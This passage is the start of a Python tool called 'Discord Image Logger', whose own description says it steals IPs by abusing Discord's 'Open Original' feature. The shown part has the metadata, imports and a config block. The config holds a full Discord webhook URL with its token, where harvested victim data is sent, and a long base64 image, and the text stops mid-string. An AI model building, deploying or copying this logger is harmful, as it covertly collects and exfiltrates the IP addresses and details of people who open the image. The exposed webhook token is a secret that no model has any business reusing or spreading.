# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1413633037752733817/L3TQsSDNH-NBSgIkWbmpligCIPKBEHlvwXGIQOKYZ5mQF0HX9asDv1oQ9BIBUgSHD21B",
    "image": "data:image/jpeg;base64,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